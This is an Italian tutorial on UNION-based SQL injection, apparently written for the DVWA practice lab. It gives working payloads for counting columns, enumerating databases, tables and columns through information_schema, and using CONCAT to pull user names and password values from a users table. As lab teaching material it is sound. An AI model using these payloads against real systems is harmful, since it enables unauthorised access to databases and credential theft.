# 🛡️ SQL Injection – Enumerazione Database con UNION

## 🔍 Query di partenza

```sql
SELECT Name, Surname 
FROM tabella 
WHERE ID='<input>';
```

L'applicazione inserisce direttamente l'input utente nella query SQL senza sanitizzazione → vulnerabile a **SQL Injection**.

---

## 🔢 0. Scoprire il numero di colonne

Prima di utilizzare `UNION`, è fondamentale capire quante colonne restituisce la query originale.

### 🔍 Metodo 1: `ORDER BY`

Si prova a incrementare progressivamente l’indice fino a ottenere un errore:

```sql
' ORDER BY 1 -- #
' ORDER BY 2 -- #
' ORDER BY 3 -- #
```
👉 Quando si verifica un errore, significa che si è superato il numero di colonne.

✔️ Esempio:

- ORDER BY 2 → funziona
- ORDER BY 3 → errore

➡️ La query ha 2 colonne

### 🔗 Metodo 2: UNION SELECT

Si costruiscono query UNION con un numero crescente di colonne:

```sql
' UNION SELECT 1 -- #
' UNION SELECT 1,2 -- #
' UNION SELECT 1,2,3 -- # 
' UNION SELECT 1,2,3,4 -- #
``` 

👉 Quando la query funziona senza errori, si è trovato il numero corretto di colonne.

---


## 📚 1. Enumerazione dei Database

```sql
' UNION SELECT SCHEMA_NAME, 2 
FROM Information_schema.SCHEMATA -- #
```

👉 Recupera i nomi di tutti i database presenti nel DBMS.

---

## 📂 2. Enumerazione delle Tabelle

```sql
' UNION SELECT TABLE_NAME, 2 
FROM Information_schema.TABLES 
WHERE TABLE_SCHEMA = 'dvwa' -- #
```

👉 Mostra tutte le tabelle del database `dvwa`.

---

## 📑 3. Enumerazione delle Colonne

```sql
' UNION SELECT COLUMN_NAME, 2 
FROM Information_schema.COLUMNS 
WHERE TABLE_SCHEMA = 'dvwa' 
AND TABLE_NAME = 'users' -- #
```

👉 Elenca le colonne della tabella `users`.

---

## 🔓 4. Estrazione dei Dati

```sql
' UNION SELECT USER_ID, 2 FROM users -- #
```

👉 Primo test per verificare l'accesso ai dati.

---

## 🧩 5. Bypass del limite sulle colonne con `CONCAT`

Quando il numero di colonne della query originale è limitato (in questo caso 2), si può usare `CONCAT` per unire più valori in una sola colonna:

```sql
' UNION SELECT CONCAT(
    USER_ID, "-", 
    FIRST_NAME, "-", 
    LAST_NAME, "-", 
    USER, "-", 
    PASSWORD, "-", 
    LAST_LOGIN
), 2 
FROM users -- #
```

👉 Permette di estrarre più informazioni in una singola colonna.

---

## ⚠️ Note

- Il numero di colonne nella `UNION` deve corrispondere a quello della query originale.
- I tipi devono essere compatibili.
- `--` serve per commentare il resto della query originale (mettere uno *spazio* e un carattere qualsiasi dopo il commento per far sì che `--` venga interpretato correttamente dal DBMS come commento).


